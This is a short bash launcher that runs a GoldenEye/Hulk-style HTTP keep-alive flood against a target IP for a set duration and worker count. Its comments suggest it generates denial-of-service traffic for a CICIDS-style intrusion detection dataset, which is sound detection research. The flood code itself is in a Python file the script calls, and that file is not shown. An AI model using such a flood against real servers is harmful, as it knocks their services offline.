#!/usr/bin/env bash
# CICIDS DoS Hulk / GoldenEye. Application-layer HTTP flood against live nginx, NOT a
# raw SYN flood (which would be single-packet flows that the sensor drops). Each worker
# holds keep-alive sockets and sends cache-busted GETs, so flows complete and carry
# rate/size signal. No em dashes.
set -euo pipefail
TARGET=""; DURATION="${DURATION:-30}"; WORKERS="${WORKERS:-50}"
while [ $# -gt 0 ]; do case "$1" in
  --target) TARGET="${2:?}"; shift 2;;
  --duration) DURATION="${2:?}"; shift 2;;
  --workers) WORKERS="${2:?}"; shift 2;;
  *) shift;; esac; done
[ -n "$TARGET" ] || { echo "usage: $0 --target <ip> [--duration s] [--workers n]" >&2; exit 2; }

echo "TOOL goldeneye http://${TARGET}:80/ duration=${DURATION}s workers=${WORKERS}"
echo "START_EPOCH $(date +%s)"
python3 /attacks/goldeneye.py --url "http://${TARGET}:80/" --duration "$DURATION" --workers "$WORKERS" || true
echo "END_EPOCH $(date +%s)"
